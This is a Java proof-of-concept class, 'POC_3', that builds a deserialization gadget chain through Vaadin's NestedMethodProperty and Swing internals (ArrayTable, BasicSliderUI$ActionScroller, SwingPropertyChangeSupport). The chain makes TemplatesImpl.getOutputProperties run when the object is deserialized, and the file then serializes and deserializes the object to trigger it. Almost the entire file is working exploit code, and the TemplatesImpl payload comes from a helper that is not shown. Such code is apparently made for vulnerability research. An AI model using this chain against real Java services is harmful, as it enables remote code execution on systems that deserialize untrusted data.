package com.example.Vaadin;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;

import javax.swing.event.SwingPropertyChangeSupport;

public class POC_3 {

    /***
     * run with action_equals.jar
     */

    public static void main(String[] args) throws Exception {
        TemplatesImpl tmpl = Share.getTemplatesImplObj();

        PropertysetItem pItem = new PropertysetItem();

        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object>(tmpl, "outputProperties");
        pItem.addItemProperty("outputProperties", nmprop);

        Object xString = ReflectionUtil.createObject("com.sun.org.apache.xpath.internal.objects.XString", new Class[]{Object.class}, new Object[]{"str"});

        Object action = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.plaf.basic.BasicSliderUI$ActionScroller"));
        Object arrayTable = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.ArrayTable"));
        Object[] table = new Object[]{"key", xString, "key", pItem};

        ReflectionUtil.setField(arrayTable, "table", table);
        SwingPropertyChangeSupport changeSupport = new SwingPropertyChangeSupport("bean");
        ReflectionUtil.setField(action, "arrayTable", arrayTable);
        ReflectionUtil.setField(action, "changeSupport", changeSupport);

        SerializeUtil.deserialize(SerializeUtil.serialize(action));
    }

}
